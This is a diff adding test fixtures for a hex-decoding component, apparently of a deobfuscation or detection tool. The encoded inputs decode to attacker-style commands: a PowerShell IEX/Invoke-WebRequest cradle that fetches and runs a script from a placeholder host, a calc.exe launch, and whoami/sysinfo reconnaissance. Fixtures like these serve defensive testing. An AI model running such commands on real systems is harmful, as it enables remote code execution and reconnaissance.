@@ -1,0 +1,6 @@
+# hex-decode · Golden Fixtures · RC3.2a
+# Bare hex (0-9a-f). Whitespace-separated hex is out of scope — that's
+# `custom-hex-slash` or `charcode-decode` territory.
+{"case_id":"hex-plain-ps","description":"Bare hex → PowerShell IEX","input":"706f7765727368656c6c2e657865202d63204945582028496e766f6b652d5765625265717565737420276874747073203a2f2f612e622f782e70733127292e436f6e74656e74","detect_min_confidence":0.5,"expected_output_contains":["powershell.exe","IEX","Invoke-WebRequest"]}
+{"case_id":"hex-uppercase","description":"Uppercase hex still decodes","input":"636D642E657865202F632063616C632E657865","detect_min_confidence":0.5,"expected_output":"cmd.exe /c calc.exe"}
+{"case_id":"hex-cmd-recon","description":"Hex → cmd whoami","input":"636d642e657865202f632077686f616d6920262620737973696e666f","detect_min_confidence":0.5,"expected_output_contains":["cmd.exe","whoami"]}
